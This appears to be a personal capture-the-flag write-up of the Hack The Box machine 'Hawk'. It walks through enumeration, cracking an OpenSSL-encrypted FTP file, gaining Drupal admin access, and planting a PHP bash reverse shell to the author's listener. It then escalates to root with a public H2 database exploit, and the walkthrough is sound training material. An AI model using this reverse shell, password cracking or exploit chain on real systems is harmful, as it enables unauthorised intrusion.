![Pasted image 20230816090010](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/e8f510f4-94f4-47b4-b35f-7c0f9471dd9b)

# Enumeration
nmap:
```
Nmap scan report for 10.129.95.193
Host is up (0.010s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.58
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e40ccbc5a59178ea5496af4d03e4fc88 (RSA)
|   256 95cbf8c7355eafa9448b17594ddb5adf (ECDSA)
|_  256 4a0b2ef71d99bcc7d30b9153b93be279 (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-favicon: Unknown favicon MD5: 8EAA69F8468C7E0D3DFEF67D5944FF4D
|_http-title: H2 Console
| http-methods: 
|_  Supported Methods: GET POST
9092/tcp open  XmlIpcRegSvc?

```
Lots of ports open
- 21 - FTP: could be useful
- 22 - SSH: Not likely
- 80 - HTTP: Web site running Apache 2.4.29
- 5435 - tcpwrapped: not sure what that is 
- 8082 - HTTP: looks like a web service running something called H2 database http console, whatever that is... 
- 9092 - XmlIpcRegSvc: Not sure what that is... 

# Website
The web page on 80 is running a Drupal login
![Pasted image 20230816090917](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/489a5292-1aa0-43c0-8f08-f0592ca41b90)

Port 8082 web page shows this:
```
H2 Console

Sorry, remote connections ('webAllowOthers') are disabled on this server. 
```

I'll focus on the main web page for now. 

The drupal version running is Drupal 7.58 released in early 2018

Verified that there is an admin user created by trying to make one myself. Drupal notifies you if a name is already taken. 
Looking deeper into exploits related to this version, it may be possible to upload code snippets to try and get a shell, but I will need admin access to do so. 

Changing to the FTP port, 
From inside the FTP share, there is a hidden message:
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
```
Inside this file is a scrambled code that looks like it might be base64. I'll point cyberchef at it to try and decode it... 

Code:
```base64
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```
Decoded:
```
Salted__kY Ôi-6°lóýÉ7Z°´>{Î$p¬­Æ
```
Not sure what I'm looking at, but I do see that it contains "Salted___" in the code. Googling that reveals that it is a salted openSSL encrypted message. I'll need to figure out how to decrypt it to move forward...

> Interesting note thanks to [Ippsec](https://www.youtube.com/@ippsec): counting the words can tell you a lot about what cypher was used to encrypt. In this case, using `wc message.txt` reveals that the message is 176 characters long which is divisible by 8. This means that it is most likely a block cypher.

Using the help command in openssl reveals it could be any of these cyphers:
```
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc           
rc2-cfb           rc2-ecb           rc2-ofb           rc4               
rc4-40            seed              seed-cbc          seed-cfb          
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb           
sm4-ctr           sm4-ecb           sm4-ofb
```

Given that exhaustive list, I think starting with low hanging fruit is best. There is a tool I discovered which could help called [bruteforce-salted-openssl](https://www.kali.org/tools/bruteforce-salted-openssl/) which can be used to find the password. Reading the documentation for the tool, it shows that I'll need to specify a wordlist for the password, a cipher text (aes-256-cbc is the most common it seems), and a message digest. Looking into typical openssl, it shows sha265 is most common. 
```
$ bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 message.txt 
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 31
Tried passwords per second: inf
Last tried password: carlos

Password candidate: friends

```
Might be a hit!
```
$ openssl enc -aes-256-cbc -d -in message.txt -out decrypted.txt -k friends
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.

$ cat decrypted.txt 
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department

```

Cool. Got the password for the drupal portal!
```
admin
PencilKeyboardScanner123
```
Now I need to try and get a shell!

# Foothold

Checking the creation of content, there is a drop down menu showing what content type I want. I want php but it is not there. Checking in the admin settings under Modules, there is an option for PHP filtering I need to enable. After saving and creating a new article, I am able to set it as PHP. 
![Pasted image 20230816102803](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/acba8eef-3363-41a3-b9c7-b185e654bd64)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.58/1234 0>&1'"); ?>
```
And then clicking preview gives me a shell!
From here I am able to view the /home/ directory and see there is a directory for `daniel` with the user flag which I actually can read even though I am www-data
```
www-data@hawk:~$ cat /home/daniel/user.txt
cXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX4
```

Interesting that www-data is allowed to read the user flag. Not tipical but a win is a win...

# Priv-Esc
Running linpeas found a few things. there is a php password somewhere 
```
drupal4hawk
```
Might be a database password... 

I tried using this as an ssh password and it did let me in. Interestingly enough, this looks like it is a python shell. I can get a proper bash shell using
```python
>>> import os
>>> os.system("bash");
```

```
Last login: Wed Aug 16 14:42:32 2023 from 10.10.14.58
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> os.system("bash");
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'os' is not defined
>>> import os
>>> os.system("bash");
daniel@hawk:~$ whoami && id
daniel
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
daniel@hawk:~$ 

```

Now, way back in my earlier enumeration, I found a web page for a database called H2 that did not allow remote connections. I might be able to connect with Daniel's local account now. So now I want my ssh to forward to that database port on 8082 with daniels credentials. I can port forward with the following command:
```bash
ssh -L 127.0.0.1:9002:127.0.0.1:8082 daniel@10.129.95.193
```
With this, I should be able to access the H2 database page by going to 127.0.0.1:9002 in a web browser:
![Pasted image 20230816110051](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/4121ecdd-2747-4b14-91b9-e845e6faf736)

Woo!
Now I need to see if I can't find credentials for this thing using Daniel. I should try and search for files relating to H2...
```
daniel@hawk:~$ ps -ef | grep h2
root       773   772  0 12:53 ?        00:00:03 /usr/bin/java -jar /opt/h2/bin/h
daniel   11197 11178  0 15:03 pts/0    00:00:00 grep h2
daniel@hawk:~$ 
```
Looks like it's in /opt/h2/
permission denied... boo. 


-------------------

After some playing around, I was able to find a local script exploit that does the trick here!
![Pasted image 20230816112934](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/e0f5730b-cfa6-4da8-b3d2-02bde92f7b88)

script 44422.py is for arbitrary code execution using an alias. I'll just need to get it on the box...

Once I do that, I just need to craft my statement. The -d flag is confusing and I'm not entirely sure what it means, but I can see that it correlates to something I'm seeing on the h2 page. I can do something similar to that I think. 

```
daniel@hawk:/tmp$ python3 44422.py 
usage: 44422.py [-h] -H 127.0.0.1:4336 [-d jdbc:h2~/test] [-u username] [-p password]
44422.py: error: the following arguments are required: -H/--host

daniel@hawk:/tmp$ python3 44422.py -H 127.0.0.1:8082 -d jdbc:h2:~/htb-hawk
cmdline@ id
uid=0(root) gid=0(root) groups=0(root)
cmdline@ cat /root/root.txt
fXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXd
```
Hawk has been PWNED!
